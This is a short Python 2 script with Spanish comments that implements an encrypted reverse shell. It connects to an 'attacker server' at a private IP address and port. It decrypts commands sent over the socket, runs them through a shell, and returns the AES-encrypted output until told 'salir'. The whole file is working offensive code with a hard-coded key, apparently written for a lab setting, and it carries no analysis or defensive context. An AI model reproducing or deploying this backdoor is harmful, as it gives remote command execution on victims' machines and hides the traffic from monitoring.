#!/usr/bin/python

from Crypto.Cipher import AES
import subprocess,socket
import base64
import os


EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))

# Se crea una clave secreta aleatoria
secret = "HUISA78sa9y&9syYSsJhsjkdjklfs9aR"

# Se crea un objeto AES usando la clave secreta aleatoria
cipher = AES.new(secret,AES.MODE_CFB)

# Se cifra una cadena
# encoded = EncodeAES(cipher, 'password')
# print 'Cadena cifrada:', encoded

# Se descifra una cadena
# decoded = DecodeAES(cipher, encoded)
# print 'Cadena descifrada:', decoded

# Configuracion del servidor atacante
HOST = '192.168.154.129'
PORT = 4445

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((HOST, PORT))

saludo = EncodeAES(cipher, 'Empieza la fiesta!EOF')
s.send(saludo)

while 1:
	# esta info se recibe cifrada
	data = s.recv(1024)
	
	# Se descifra el comando recibido
	descifrado = DecodeAES(cipher, data)
	
	# Se comprueba si hay que salir
	if descifrado == "salir":
                datos = "salir \n EOF"
                datoscifrados = EncodeAES(cipher, datos)
                s.send(datoscifrados)
		break
		
	# Se ejecuta el comando recibido y descifrado
	proc = subprocess.Popen(descifrado, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
	
	# Se guarda la salida del comando ejecutado
	stdoutput = proc.stdout.read() + proc.stderr.read() + 'EOF'
	# Se cifra la salida del comando ejecutado
	cifrado = EncodeAES(cipher, stdoutput)
	s.send(cifrado)


s.close()
